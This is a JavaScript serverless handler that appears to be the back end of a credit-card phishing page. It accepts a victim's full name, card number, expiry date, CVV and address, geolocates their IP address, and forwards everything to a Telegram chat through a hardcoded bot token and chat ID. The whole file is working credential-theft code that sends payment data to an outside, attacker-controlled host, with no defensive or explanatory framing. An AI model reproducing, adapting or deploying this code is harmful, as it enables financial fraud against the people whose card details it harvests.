const TELEGRAM_BOT_TOKEN = '7989289138:AAEeHZVWnWl6zVx3e08KEfdrJGCcAy7MFlY';
const TELEGRAM_CHAT_ID = '-1002429976015';

import fetch from 'node-fetch';

async function sendTelegramMessage(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML'})
  });
}

async function getIPInfo(ip) {
  try {
    const res = await fetch(`https://ipapi.co/${ip}/json/`);
    if (!res.ok) return null;
    const data = await res.json();
    return data;
  } catch {
    return null;
  }
}

function getIP(req) {
  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  const {fullname, cardnumber, expiredate, cvv, address} = req.body || {};

  const ip = getIP(req);
  const ipInfo = await getIPInfo(ip);
  const country = ipInfo?.country_name || 'Unknown';

  const text = `<b>Credit Card Info</b>\nName: ${fullname}\nCard Number: ${cardnumber}\nExpire: ${expiredate}\nCVV: ${cvv}\nAddress: ${address}\nIP: ${ip}\nCountry: ${country}\nTime: ${new Date().toLocaleString()}`;
  await sendTelegramMessage(text);

  res.status(200).json({status: 'ok'});
}
